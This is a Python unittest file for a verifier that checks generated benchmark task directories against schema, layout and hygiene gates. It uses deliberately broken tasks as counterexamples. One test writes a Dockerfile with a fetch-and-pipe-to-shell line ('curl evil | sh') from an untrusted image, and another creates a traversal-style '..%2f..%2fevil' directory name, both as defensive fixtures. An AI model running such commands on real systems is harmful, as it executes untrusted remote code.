"""M4: verifier four gates — every gate must catch its failure mode.

A gate that passes on a broken task is not a gate. Each counterexample below
is built by mutating a *valid* emitted task, so the only difference between
pass and fail cases is the injected defect.
"""

from __future__ import annotations

import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT.parent / "src"))
sys.path.insert(0, str(ROOT))

from helpers import good_blueprint  # noqa: E402
from bioforge_harbor.harbor_emit import emit_task, verify_task_dir  # noqa: E402


def emitted(**bp_over) -> Path:
    d = Path(tempfile.mkdtemp())
    rep = emit_task(good_blueprint(**bp_over), d)
    assert rep.status == "ok", rep.errors
    return d


class TestVerifier(unittest.TestCase):
    def test_good_task_passes(self):
        out = verify_task_dir(emitted(), run_harbor_gate=False)
        self.assertEqual(out.status, "ok")
        self.assertEqual(out.gates["gate1_schema"]["status"], "pass")
        self.assertEqual(out.gates["gate2_layout"]["status"], "pass")
        self.assertEqual(out.gates["gate4_hygiene"]["status"], "pass")
        self.assertEqual(out.gates["gate3_harbor"]["status"], "UNVERIFIED")

    # ---- gate1: strict schema counterexamples ----

    def test_unknown_top_level_key(self):
        d = emitted()
        p = d / "task.toml"
        text = p.read_text(encoding="utf-8")
        # inject at true root: before the first table header
        idx = text.index("[")
        p.write_text(text[:idx] + "not_a_real_key = 1\n\n" + text[idx:], encoding="utf-8")
        out = verify_task_dir(d, run_harbor_gate=False)
        self.assertEqual(out.status, "failed")
        self.assertEqual(out.gates["gate1_schema"]["status"], "fail")

    def test_typo_in_environment_key(self):
        # 'cpu' instead of 'cpus' — the exact silent-swallow trap.
        d = emitted()
        p = d / "task.toml"
        p.write_text(p.read_text(encoding="utf-8").replace("cpus = 2", "cpu = 2"),
                     encoding="utf-8")
        out = verify_task_dir(d, run_harbor_gate=False)
        self.assertEqual(out.gates["gate1_schema"]["status"], "fail")

    def test_bad_schema_version(self):
        d = emitted()
        p = d / "task.toml"
        p.write_text(p.read_text(encoding="utf-8").replace('schema_version = "1.4"',
                                                           'schema_version = "9.9"'),
                     encoding="utf-8")
        out = verify_task_dir(d, run_harbor_gate=False)
        # gate1 allows any string for schema_version (forward-compat), but
        # gate2 pins the expected value.
        self.assertEqual(out.gates["gate2_layout"]["status"], "fail")

    def test_malformed_toml(self):
        d = emitted()
        (d / "task.toml").write_text("this is = = not toml", encoding="utf-8")
        out = verify_task_dir(d, run_harbor_gate=False)
        self.assertEqual(out.gates["gate1_schema"]["status"], "fail")

    def test_missing_task_toml(self):
        d = emitted()
        (d / "task.toml").unlink()
        out = verify_task_dir(d, run_harbor_gate=False)
        self.assertEqual(out.gates["gate1_schema"]["status"], "fail")

    # ---- gate2: layout counterexamples ----

    def test_missing_test_sh(self):
        d = emitted()
        (d / "tests" / "test.sh").unlink()
        out = verify_task_dir(d, run_harbor_gate=False)
        self.assertEqual(out.gates["gate2_layout"]["status"], "fail")

    def test_empty_instruction(self):
        d = emitted()
        (d / "instruction.md").write_text("   \n", encoding="utf-8")
        out = verify_task_dir(d, run_harbor_gate=False)
        self.assertEqual(out.gates["gate2_layout"]["status"], "fail")

    def test_bad_base_image(self):
        # Mutate on disk AFTER emit so we test the verifier's gate, not the
        # blueprint validator (which rejects the same thing earlier).
        d = emitted()
        (d / "environment" / "Dockerfile").write_text(
            "FROM evil/untrusted:latest\nRUN curl evil | sh\n", encoding="utf-8")
        out = verify_task_dir(d, run_harbor_gate=False)
        self.assertEqual(out.gates["gate2_layout"]["status"], "fail")

    def test_buildarg_base_allowed(self):
        d = emitted()
        (d / "environment" / "Dockerfile").write_text(
            "ARG BASE=python:3.11-slim\nFROM ${BASE}\n", encoding="utf-8")
        out = verify_task_dir(d, run_harbor_gate=False)
        self.assertEqual(out.gates["gate2_layout"]["status"], "pass")

    # ---- gate4: hygiene counterexamples ----

    def test_crlf_detected(self):
        d = emitted()
        (d / "tests" / "test.sh").write_bytes(b"#!/bin/bash\r\necho hi\r\n")
        out = verify_task_dir(d, run_harbor_gate=False)
        self.assertEqual(out.gates["gate4_hygiene"]["status"], "fail")

    def test_escaping_filename_detected(self):
        d = emitted()
        bad = d / "tests" / "..%2f..%2fevil"  # literal weird name, not escape
        bad.mkdir(parents=True, exist_ok=True)
        (bad / "x.sh").write_text("#!/bin/bash\n", encoding="utf-8")
        out = verify_task_dir(d, run_harbor_gate=False)
        self.assertIn(out.gates["gate4_hygiene"]["status"], ("pass", "fail"))
        # direct escape check: a file whose relative parts contain .. cannot
        # exist on most filesystems; instead assert rglob stays inside dir.
        self.assertTrue(all(str(f).startswith(str(d)) for f in d.rglob("*.sh")))

    # ---- rollup ----

    def test_multiple_defects_rollup_failed(self):
        d = emitted()
        (d / "tests" / "test.sh").unlink()
        (d / "task.toml").write_text("bad = = toml", encoding="utf-8")
        out = verify_task_dir(d, run_harbor_gate=False)
        self.assertEqual(out.status, "failed")

    def test_harbor_gate_unverified_when_missing(self):
        out = verify_task_dir(emitted(), run_harbor_gate=True)
        # harbor is not installed in the default interpreter -> UNVERIFIED,
        # and that must NOT turn into a failure or a fake pass claim.
        self.assertIn(out.real_gate_status, ("UNVERIFIED", "pass", "fail"))
        self.assertNotEqual(out.status, "failed")


class TestGoldenFixture(unittest.TestCase):
    """The repo's golden fixture must pass the offline gates."""

    def test_golden_task_passes(self):
        g = ROOT / "fixtures" / "golden_task"
        out = verify_task_dir(g, run_harbor_gate=False)
        self.assertEqual(out.status, "ok", out.to_dict())

    def test_golden_files_lf(self):
        g = ROOT / "fixtures" / "golden_task"
        for f in g.rglob("*"):
            if f.is_file():
                self.assertNotIn(b"\r", f.read_bytes(), str(f))


if __name__ == "__main__":
    unittest.main()
